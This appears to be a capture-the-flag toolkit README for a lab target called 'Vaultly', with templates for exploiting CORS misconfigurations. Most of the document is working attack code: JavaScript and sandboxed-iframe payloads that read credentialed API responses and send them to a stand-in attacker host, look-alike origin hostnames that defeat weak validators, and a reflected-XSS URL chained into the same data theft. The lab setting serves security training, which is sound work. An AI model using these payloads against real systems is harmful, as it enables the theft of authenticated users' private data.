# Vaultly — PoC Toolkit

These are **templates**, not answers. Recon finds the vulnerable endpoint; the
in-response **hints** tell you which technique it needs. You fill in the blanks:

- `__ENDPOINT__` → the path you found on `api.vaultly.lab` (e.g. `/api/v2/...`)
- `__ATTACKER_HOST__` → the origin you serve from (table below)

The attacker origins are fixed infrastructure (they already resolve + have certs):

| Technique the hint points to | Serve / deliver from |
|---|---|
| reflects any origin | `https://evil.lab/e` |
| trusts `null` | `https://evil.lab/e` (sandboxed-iframe PoC) |
| our domain must appear in the origin | `https://vaultly.lab.evil.lab/e` |
| regex look-alike (dot = any char) | `https://vaultlyxlab.evil.lab/e` |
| only real `*.vaultly.lab` is trusted | XSS on `https://status.vaultly.lab` |
| a forgotten `http://` origin is trusted | `http://legacy.vaultly.lab/e` |

Workflow for every exploit flag: **store PoC on `https://evil.lab` → deliver the
right hostname from `https://ctf.vaultly.lab` → read the loot at
`https://evil.lab/log`.**

---

## 0. Detection (do this first, for any endpoint)

In Burp Repeater, take a request to a candidate endpoint and add:

```
Origin: https://evil.lab
```

Look at the response headers. If you see your origin echoed back:

```
Access-Control-Allow-Origin: https://evil.lab
Access-Control-Allow-Credentials: true
```

…the endpoint is misconfigured. The body will include a `checkpoint` flag and a
`hint`. If your origin is **not** reflected, read the hint style for that
condition and craft an origin the validator *will* accept (try the variations in
the table above).

> curl works too, but remember: curl shows the header, it does **not** enforce
> CORS. The real flag needs a browser read as the victim.

---

## 1. Reflected-origin PoC (host on `https://evil.lab`)

```html
<script>
fetch('https://api.vaultly.lab/__ENDPOINT__', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('/collect?d=' + encodeURIComponent(d)));
</script>
```
Deliver `https://evil.lab/e` to the victim.

---

## 2. null-origin PoC (sandboxed iframe forces `Origin: null`)

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://api.vaultly.lab/__ENDPOINT__', { credentials:'include' })
      .then(r => r.text())
      .then(d => location =
        'https://evil.lab/collect?d=' + encodeURIComponent(d));
  &lt;/script&gt;"></iframe>
```
Deliver `https://evil.lab/e`.

---

## 3. Domain-in-origin PoC (substring / prefix check)

Same body as #1 — the trick is **where you serve it from**. Store it, then deliver
the hostname that contains the trusted domain:

```
https://vaultly.lab.evil.lab/e
```

---

## 4. Regex look-alike PoC (unescaped dot)

Same body as #1. The validator's unescaped `.` matches any character, so a host
with no real dot in the trusted spot still passes. Deliver:

```
https://vaultlyxlab.evil.lab/e
```

---

## 5. XSS → CORS chain (trusted subdomain)

You can't host a real `*.vaultly.lab`, but a trusted subdomain has reflected XSS.
Inject your CORS reader through it and deliver **that** URL to the victim:

```
https://status.vaultly.lab/?msg=<script>fetch('https://api.vaultly.lab/__ENDPOINT__',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.lab/collect?d='+encodeURIComponent(d)))</script>
```

(Deliver the whole URL from the scoreboard — no exploit-server storing needed.)

---

## 6. Insecure-origin PoC (http is trusted)

Same body as #1, but served over the forgotten insecure origin. Deliver:

```
http://legacy.vaultly.lab/e
```

---

## Reading the loot

Open `https://evil.lab/log` (auto-refreshes). The victim's response appears with a
`flag` field — that's your exploit flag. Submit it on the scoreboard under your
handle.

**Tip for the write-up:** a strong finding shows the request/response proving
reflection + credentials, the PoC, and the exact sensitive field you stole — not
just "the header was reflected."
